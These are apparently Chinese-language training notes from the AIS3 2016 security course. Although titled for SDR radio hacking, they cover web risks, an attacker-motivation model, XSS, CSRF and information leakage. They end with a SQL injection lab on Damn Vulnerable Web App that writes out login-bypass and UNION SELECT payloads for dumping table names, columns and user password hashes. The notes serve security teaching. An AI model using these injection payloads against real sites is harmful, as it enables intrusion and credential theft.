# AIS3 DAY4-2 Reverse engineering and hacking radio with SDR
<!-- https://paper.dropbox.com/doc/0x00-AIS3-2016-Notes-D21AukBJQ6g8YvWmd5mB1 -->

滲透測試服務
- 以駭客的思維出發，模擬攻擊者的思維進行攻擊測試

SQL injection防禦
- PDO

企業常見安全風險 (O和各資有關)
- 跨腳本攻擊 (XSS) O
- 資料庫注入攻擊 (SQL injection) O
- 功能缺少權限控管 O
- 指令注入攻擊 O
- 資訊洩漏
- 跨站冒名請求
- 不安全的直接存取物件 O
- 未驗證的轉址
- 錯誤訊息洩漏
- 商業邏輯漏洞 O
- 其他

資安事件的6W5H
- Who(攻擊者是誰?)
- Why(為什麼要攻擊我?)
  - 為了錢財利益而攻擊
  - 公務 , 私人恩怨　
- What(攻擊者要的是什麼?)
  - 可以販賣的資料
    - 個資
    - 金融資料
    - 帳號密碼
    - 企業內部機敏資料
  - 可利用資源
    - 做為跳板
    - 作為「肉機」
    - 作為殭屍網路
- Whom(為什麼是我?)
  - 軟柿子
    - 含有明顯漏洞的網站比較好下手
  - 還彈試爆場
    - 最近出現的新漏洞新攻擊手法
  - 看起來有錢人　
    - 擁有大量金錢 如交易平台 比特幣
- Where(從哪裡攻擊?)
  - 正面迎擊
    - 當網站有漏洞未修補安全問題 或是網站吸引入侵者
  - 側面襲擊
    - 透過入侵企業小型站台，或同主機其他站台攻回目標，又稱為「旁注」。
    - 如果正面無法被入侵，攻擊者會尋找同IP、或鄰近網段的其他主機進行攻擊，若攻擊成功有機會可以滲透回目標網站。
    - 企業必須將伺服器的網站單純化，避免不必要的站台共存，並且將同網段類主機信賴關係盤點清楚。
  - 背後突擊
    - 透過社交工程等方式，滲透企業內部，從背後發動攻擊。目前APT攻擊多採取此類方式，難以防禦。
    - 攻擊者會製作一個惡意文件寄送給企業的關鍵人物誘使他開啟若該人員沒有充分的資安思維或是…
  - 防火牆只要擋外部連線嗎？
    - 擋由內到外的連線 (reverse shell)
- When(甚麼時候發動攻擊?)
  - 無時無刻
  - 有重大新漏洞發表的時候 (heartbleed)
  - 企業被歇漏資安漏洞時
- How(怎麼攻擊?)
- How much(雙方的資源競爭)
  - 敵暗我明，攻擊者只要利用一點資源，狙擊企業的弱點，就能夠得到預期的資料 ，但當防禦等即達到一定程度，攻擊者就必須要花極高的成本達到攻擊。
  - 但若攻擊者想達成的目的，讓他願意投入足夠的時間進是滲透(APT攻擊)，時間可能長達數個月至數年，則企業難以防禦，因無法維持長久經歷注意。
  
#### 跨腳本攻擊(Cross-Site Scripting)
##### Worst Practice
1. 在Client side 使用JavaScript防禦
  在使用者side防禦是沒用的
2. 取代字串 : 遇到<script>或</script>就取代成空字串
正確觀念
- 在後端進行防禦
- **Filter input,Escape output**
	- 所有輸入值都過濾完畢後才存到資料庫
	- 從資料庫取出的資料都先經過轉化才輸出

firefox tool 
cookie manager+ ***
fire bug
foxyProxy Standard ***
HackBar *****
Live HTTP header
Tamper Data
Web Developer

#### 跨站冒名請求(Cross-Site Request Forgery)CSRF
受害者至惡意伺服器，上面有帶有.asp的圖片，
之後受害者連至其他網頁後，該伺服器收到.asp以為是送訊息
1. 確保網站沒有任何可供XSS攻擊的弱點
2. 加上token

#### 資訊洩漏(Information Leakage)
洩漏資料庫帳號密碼
洩漏後臺位置(出貨單)
洩漏原始碼(index.php~)波浪符~~
不一定有立即風險，但可能會有危害

#### SQL injection
$str = "SELECT *FROM User Where Username='".
$user."'AND Password'".$pass."'";
→SELECT *FROM User Where Username='**' OR 1=1 --**'AND Password='OOXXX'
SELECT *FROM User Where Username='**admin'--**'AND Password=''
' OR 1=1 --
1. 找出為保護變數，作為注入點
2. 猜測完整SQL語句並嘗試插入
3. 推測欄位數、資料表名稱、
UNION (?)前後可以接語句，串接語句然後印出來，但前後欄位數要一樣
	

##### OWASP
開啟後有IP，輸入可以到網站進入
####Damn Vulnerable Web App
帳號密碼admin
- SQL injection
	在bar輸入數字後可以發現ID: 3 First name: Hack Surname: Me
	輸入'噴錯，代表可以用
	SELECT ? FROM ? WHERE id(?) = '**3'  #**'
	3' #輸入後功能正常！中間空格是可以自己填的
	輸入order by(取得欄位數量)→3'  order by 3# 錯誤可以知道只有兩個欄位
	3'  UNION SELECT user(),version()# 
	得到ID: 3'  UNION SELECT user(),version()#
	First name: dvwa@localhost ←db資訊
	Surname: 5.1.41-3ubuntu12.6-log ←
	看底下最後一個連結
	先List Table
	SELECT ? FROM ? WHERE id(?) = '3'  UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'#'
	再來List Columns
	SELECT ? FROM ? WHERE id(?) = '3'  UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'#'
	填空完成
	SELECT first_name FROM last_name WHERE id(?) = '3'  UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'#'
	SELECT first_name FROM last_name WHERE id(?) = '3'  UNION SELECT user,password FROM users #'
	得到一串的資訊，加密後的密碼只需google即可
	
	1. 找出沒有保護的變數
	2. 猜測背後的SQL語句
	3. 推測欄位數量(用ORDER BY)
	4. 確認UNION可以使用
	5. 撈出SQL其他欄位資訊
	6. 取出id=3的帳號密碼

 

